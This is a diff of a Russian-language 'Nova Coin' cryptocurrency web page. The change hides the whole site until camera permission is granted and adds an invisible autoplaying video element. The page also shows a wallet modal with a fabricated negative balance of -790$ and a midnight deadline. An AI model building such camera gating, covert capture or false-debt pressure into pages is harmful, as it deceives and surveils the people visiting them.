@@ -7,84 +7,89 @@
   <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-  <header>
-    <div class="logo">🚀 Nova Coin</div>
-    <nav>
-      <a href="#rates">Курсы</a>
-      <a href="#chart">График</a>
-      <a href="#exchange">Обмен</a>
-    </nav>
-  </header>
 
-  <!-- Главный баннер -->
-  <section class="hero">
-    <h1>Будущее за Nova Coin</h1>
-    <p>Надежная криптовалюта для новых возможностей</p>
-    <a href="#exchange" class="btn">Купить Nova Coin</a>
-  </section>
+  <!-- Видео и сообщение для проверки камеры -->
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <div id="cameraMessage"></div>
 
-  <!-- Курсы криптовалют -->
-  <section id="rates">
-    <h2>📊 Курсы криптовалют</h2>
-    <div id="crypto-prices" class="card">Загрузка данных...</div>
-  </section>
+  <!-- Основной контент сайта скрыт до разрешения камеры -->
+  <div id="mainContent" style="display:none;">
 
-  <!-- График -->
-  <section id="chart">
-    <h2>📈 График Nova Coin</h2>
-    <div class="card">
-      <canvas id="priceChart"></canvas>
+    <header>
+      <div class="logo">🚀 Nova Coin</div>
+      <nav>
+        <a href="#rates">Курсы</a>
+        <a href="#chart">График</a>
+        <a href="#exchange">Обмен</a>
+      </nav>
+    </header>
+
+    <!-- Главный баннер -->
+    <section class="hero">
+      <h1>Будущее за Nova Coin</h1>
+      <p>Надежная криптовалюта для новых возможностей</p>
+      <a href="#exchange" class="btn">Купить Nova Coin</a>
+    </section>
+
+    <!-- Курсы криптовалют -->
+    <section id="rates">
+      <h2>📊 Курсы криптовалют</h2>
+      <div id="crypto-prices" class="card">Загрузка данных...</div>
+    </section>
+
+    <!-- График -->
+    <section id="chart">
+      <h2>📈 График Nova Coin</h2>
+      <div class="card">
+        <canvas id="priceChart"></canvas>
+      </div>
+    </section>
+
+    <!-- Обмен -->
+    <section id="exchange">
+      <h2>💱 Обмен Nova Coin</h2>
+      <div class="card">
+        <form id="exchangeForm">
+          <input type="number" id="amount" min="1" value="1" placeholder="Количество Nova Coin">
+          <select id="currency">
+            <option value="usd">USD</option>
+            <option value="eur">EUR</option>
+            <option value="btc">BTC</option>
+          </select>
+          <button type="submit" class="btn">Обменять</button>
+        </form>
+        <p id="result"></p>
+      </div>
+    </section>
+
+    <!-- Модальное окно выбора -->
+    <div id="modal" class="modal">
+      <div class="modal-content">
+        <h3>Действия</h3>
+        <button id="resetChart" class="btn">Сбросить график</button>
+        <button id="depositFunds" class="btn">Внести средства</button>
+        <button id="closeModal" class="btn cancel">Закрыть</button>
+      </div>
     </div>
-  </section>
 
-  <!-- Обмен -->
-  <section id="exchange">
-    <h2>💱 Обмен Nova Coin</h2>
-    <div class="card">
-      <form id="exchangeForm">
-        <input type="number" id="amount" min="1" value="1" placeholder="Количество Nova Coin">
-        <select id="currency">
-          <option value="usd">USD</option>
-          <option value="eur">EUR</option>
-          <option value="btc">BTC</option>
-        </select>
-        <button type="submit" class="btn">Обменять</button>
-      </form>
-      <p id="result"></p>
+    <!-- Модальное окно результата -->
+    <div id="resultModal" class="modal">
+      <div class="modal-content">
+        <h3>✅ Обновление кошелька</h3>
+        <p>Ваш кошелек и счёт на бирже обновлены.</p>
+        <p><strong>Текущий баланс:</strong> -790$,время окончания 00:00</p>
+        <button id="closeResult" class="btn cancel">Закрыть</button>
+      </div>
     </div>
-  </section>
-  <section id="chart">
-  <h2>📈 График Nova Coin</h2>
-  <div class="card">
-    <canvas id="priceChart"></canvas>
-  </div>
-</section>
 
-<!-- Модальное окно выбора -->
-<div id="modal" class="modal">
-  <div class="modal-content">
-    <h3>Действия</h3>
-    <button id="resetChart" class="btn">Сбросить график</button>
-    <button id="depositFunds" class="btn">Внести средства</button>
-    <button id="closeModal" class="btn cancel">Закрыть</button>
-  </div>
-</div>
+    <footer>
+      <p>© 2025 Nova Coin | Все права защищены</p>
+    </footer>
 
-<!-- Модальное окно результата -->
-<div id="resultModal" class="modal">
-  <div class="modal-content">
-    <h3>✅ Обновление кошелька</h3>
-    <p>Ваш кошелек и счёт на бирже обновлены.</p>
-    <p><strong>Текущий баланс:</strong> -790$,время окончания 00:00</p>
-    <button id="closeResult" class="btn cancel">Закрыть</button>
-  </div>
-</div>
-
-  <footer>
-    <p>© 2025 Nova Coin | Все права защищены</p>
-  </footer>
+  </div> <!-- конец mainContent -->
 
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <script src="script.js"></script>
+  <script src="cryptoLogic.js"></script> <!-- твой текущий JS для курсов, графика, обмена -->
 </body>
-</html> 
+</html>
